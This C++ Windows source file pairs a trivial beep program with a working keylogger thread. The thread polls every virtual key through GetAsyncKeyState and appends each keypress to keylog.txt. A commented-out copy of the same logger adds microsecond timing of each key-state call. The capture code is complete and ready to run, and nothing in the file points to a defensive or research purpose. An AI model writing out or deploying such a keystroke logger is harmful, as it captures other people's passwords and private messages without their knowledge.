#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>

// Global variables for keyboard logging
std::ofstream logFile;
bool isLogging = true;
std::string logFileName = "keylog.txt";

// Function to convert virtual key code to string
std::string VirtualKeyToString(int vkCode) {
    // Handle special keys
    switch (vkCode) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "\n";
    case VK_TAB: return "\t";
    case VK_BACK: return "[BACKSPACE]";
    case VK_ESCAPE: return "[ESCAPE]";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_CAPITAL: return "[CAPS LOCK]";
    case VK_NUMLOCK: return "[NUM LOCK]";
    case VK_SCROLL: return "[SCROLL LOCK]";
    case VK_LWIN: return "[LEFT WIN]";
    case VK_RWIN: return "[RIGHT WIN]";
    case VK_APPS: return "[APP MENU]";
    case VK_PRIOR: return "[PAGE UP]";
    case VK_NEXT: return "[PAGE DOWN]";
    case VK_END: return "[END]";
    case VK_HOME: return "[HOME]";
    case VK_LEFT: return "[LEFT ARROW]";
    case VK_UP: return "[UP ARROW]";
    case VK_RIGHT: return "[RIGHT ARROW]";
    case VK_DOWN: return "[DOWN ARROW]";
    case VK_INSERT: return "[INSERT]";
    case VK_DELETE: return "[DELETE]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    default:
        // Handle regular characters
        if (vkCode >= 0x30 && vkCode <= 0x5A) { // 0-9, A-Z
            char c = static_cast<char>(vkCode);
            return std::string(1, c);
        }
        return "[UNKNOWN]";
    }
}

// Function to check if a key is currently pressed
bool IsKeyPressed(int vkCode) {
    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
}

// Keyboard logging thread function
void KeyboardLoggerThread() {
    // Open log file for writing
    logFile.open(logFileName, std::ios::out | std::ios::app);

    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file: " << logFileName << std::endl;
        return;
    }

    // Arrays to track key states
    bool lastState[256] = { false };
    bool currentState[256] = { false };

    std::cout << "[*] Keyboard logging started. Press Ctrl+C to stop." << std::endl;

    while (isLogging) {
        // Check all keys
        for (int i = 0; i < 256; i++) {
            currentState[i] = IsKeyPressed(i);

            // If key was not pressed before but is now pressed
            if (!lastState[i] && currentState[i]) {
                std::string keyName = VirtualKeyToString(i);

                // Handle special case for shift key to make letters uppercase
                if (i == VK_SHIFT) {
                    // Don't log shift key itself, just note it's active
                    continue;
                }

                // Write key to log file
                logFile << keyName;
                logFile.flush(); // Ensure immediate write

                // Also print to console for real-time feedback
                std::cout << keyName;
                std::cout.flush();
            }

            lastState[i] = currentState[i];
        }

        // Small delay to reduce CPU usage (50ms)
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    logFile.close();
    std::cout << "\n[*] Keyboard logging stopped." << std::endl;
}

int main()
{
    std::string value;

    // Start keyboard logging thread
    std::thread loggerThread(KeyboardLoggerThread);

    while (true)
    {
        // Output the current process Id
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: ";
        std::cout << GetProcessIdOfThread(currentThread);
        std::cout << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
        std::getline(std::cin, value);

        Beep(500, 500);
    }

    // Cleanup
    isLogging = false;
    if (loggerThread.joinable()) {
        loggerThread.join();
    }

    return 0;
}


/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>

// Global variables for keyboard logging
std::ofstream logFile;
bool isLogging = true;
std::string logFileName = "keylog.txt";

// Function to convert virtual key code to string
std::string VirtualKeyToString(int vkCode) {
    switch (vkCode) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "\n";
    case VK_TAB: return "\t";
    case VK_BACK: return "[BACKSPACE]";
    case VK_ESCAPE: return "[ESCAPE]";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_CAPITAL: return "[CAPS LOCK]";
    case VK_NUMLOCK: return "[NUM LOCK]";
    case VK_SCROLL: return "[SCROLL LOCK]";
    case VK_LWIN: return "[LEFT WIN]";
    case VK_RWIN: return "[RIGHT WIN]";
    case VK_APPS: return "[APP MENU]";
    case VK_PRIOR: return "[PAGE UP]";
    case VK_NEXT: return "[PAGE DOWN]";
    case VK_END: return "[END]";
    case VK_HOME: return "[HOME]";
    case VK_LEFT: return "[LEFT ARROW]";
    case VK_UP: return "[UP ARROW]";
    case VK_RIGHT: return "[RIGHT ARROW]";
    case VK_DOWN: return "[DOWN ARROW]";
    case VK_INSERT: return "[INSERT]";
    case VK_DELETE: return "[DELETE]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    default:
        if (vkCode >= 0x30 && vkCode <= 0x5A) {
            char c = static_cast<char>(vkCode);
            return std::string(1, c);
        }
        return "[UNKNOWN]";
    }
}

// Function to check if a key is pressed and measure timing
bool IsKeyPressedWithOverhead(int vkCode, double& overheadMicroseconds) {
    auto start = std::chrono::high_resolution_clock::now();
    SHORT keyState = GetAsyncKeyState(vkCode);
    auto end = std::chrono::high_resolution_clock::now();

    std::chrono::duration<double, std::micro> duration = end - start;
    overheadMicroseconds = duration.count();

    return (keyState & 0x8000) != 0;
}

// Keyboard logging thread function
void KeyboardLoggerThread() {
    logFile.open(logFileName, std::ios::out | std::ios::app);

    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file: " << logFileName << std::endl;
        return;
    }

    bool lastState[256] = { false };
    bool currentState[256] = { false };

    std::cout << "[*] Keyboard logging started. Press Ctrl+C to stop." << std::endl;

    while (isLogging) {
        for (int i = 0; i < 256; i++) {
            double overhead;
            currentState[i] = IsKeyPressedWithOverhead(i, overhead);

            if (!lastState[i] && currentState[i]) {
                std::string keyName = VirtualKeyToString(i);
                if (i == VK_SHIFT)
                    continue;

                logFile << keyName;
                logFile.flush();

                std::cout << "[Key: " << keyName << "] Overhead: "
                    << overhead << " microseconds" << std::endl;
            }

            lastState[i] = currentState[i];
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    logFile.close();
    std::cout << "\n[*] Keyboard logging stopped." << std::endl;
}

int main()
{
    std::string value;

    std::thread loggerThread(KeyboardLoggerThread);

    while (true)
    {
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
        std::getline(std::cin, value);

        Beep(500, 500);
    }

    isLogging = false;
    if (loggerThread.joinable()) {
        loggerThread.join();
    }

    return 0;
}
*/